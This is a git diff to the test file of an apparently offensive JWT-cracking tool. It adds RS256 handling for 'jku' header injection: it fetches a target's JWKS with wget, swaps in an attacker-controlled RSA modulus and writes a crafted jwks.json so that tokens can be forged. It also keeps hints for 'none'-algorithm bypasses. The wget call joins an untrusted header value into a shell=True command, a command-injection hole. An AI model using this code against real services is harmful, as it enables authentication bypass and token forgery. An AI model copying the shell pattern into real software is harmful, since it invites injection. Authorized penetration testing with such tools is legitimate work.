@@ -1,10 +1,11 @@
 #!/usr/bin/python3
 
 """
-   A file for test new implementation globally, before merging in the main file.
-   All functions that have been already tested in demo.py, with positives result,
    should be tested here before be implemented in the real script jwt-crack.py.
+   All functions that have been already tested in demo.py, with positives result,
+   A file for test new implementation globally, before merging in the main file.
 """
+
 
 __version__ = "0.1"
 __author__ = "DontPanicO"
@@ -152,7 +153,7 @@ class Cracker:
             sys.exit(2)
         """Validate alg"""
         if self.alg is not None:
-            valid_algs = ["None", "none", "HS256", "hs256"]
+            valid_algs = ["None", "none", "HS256", "hs256", "RS256", "rs256"]
             if self.alg not in valid_algs:
                 print(f"{Bcolors.FAIL}ERROR: Invalid algorithm.{Bcolors.ENDC}")
                 sys.exit(2)
@@ -161,6 +162,12 @@ class Cracker:
                     self.alg = "HS256"
                 elif self.alg == "None" or "none":
                     print(f"{Bcolors.OKBLUE}INFO: Some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
+                elif self.alg == "rs256" or self.alg == "RS256":
+                    if self.jku_basic is None:
+                        print(f"{Bcolors.ERROR}ERROR: RS256 is supported only for jku injection for now.{Bcolors.ENDC}")
+                        sys.exit(1)
+                    if self.alg == "rs256":
+                        self.alg = "RS256"
         """Force self.alg to RS256 for jku attacks"""
         if self.jku_basic is not None:
             if self.alg is not None:
@@ -282,7 +289,7 @@ class Cracker:
         .well-known/jwks.json and write into it the dumps of the dict.
         """
         devnull_ = open(os.devnull, 'wb')
-        command = "wget" + header['jku']
+        command = "wget " + header['jku']
         command_output = subprocess.check_output(command, shell=True, stdin=devnull_, stderr=devnull_)
         jwks = open("jwks.json")
         jwks_dict = json.load(jwks)
@@ -292,7 +299,7 @@ class Cracker:
         jwks_dict['keys'][0]['n'] = base64.urlsafe_b64encode(
             (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
         ).decode('utf-8').rstrip("=")
-        file = open("/.well-known/jwks.json", 'w')
+        file = open("crafted/jwks.json", 'w')
         file.write(json.dumps(jwks_dict))
         devnull_.close()
         file.close()
@@ -546,6 +553,8 @@ class Cracker:
         # print(final_token.split(".")[0] == self.token_dict['header'], final_token.split(".")[1] == self.token_dict['payload'])
         if self.file is not None:
             self.file.close()
+        if os.path.exists("jwks.json"):
+        	os.remove("jwks.json")
         sys.exit(0)
 
 
